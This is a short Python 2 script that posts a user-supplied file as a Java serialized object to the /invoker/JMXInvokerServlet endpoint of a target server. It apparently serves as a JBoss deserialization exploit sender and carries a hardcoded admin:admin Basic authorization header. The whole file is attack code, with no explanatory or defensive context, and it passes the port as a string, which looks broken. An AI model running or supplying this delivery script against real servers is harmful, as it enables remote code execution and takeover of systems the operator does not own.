__author__ = 'Administrator'

import socket
import sys


if __name__ == '__main__':
    host =  sys.argv[1]
    port =  sys.argv[2]
    payload_buf = open(sys.argv[3],'rb').read()
    #print payload_buf
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    path = r"/invoker/JMXInvokerServlet"
    sendbuf = "POST " + path + " HTTP/1.0\r\nProxy-Connection: keep-alive\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\n"
    sendbuf += "Content-Length: " + str(len(payload_buf)) + "\r\n"
    sendbuf += "Upgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36\r\n"
    sendbuf += "Content-Type: application/x-java-serialized-object; \r\n"
    sendbuf += "\r\n"
    sendbuf += payload_buf
    print sendbuf
    sock.connect((host, port))
    sock.send(sendbuf)
    sock.close()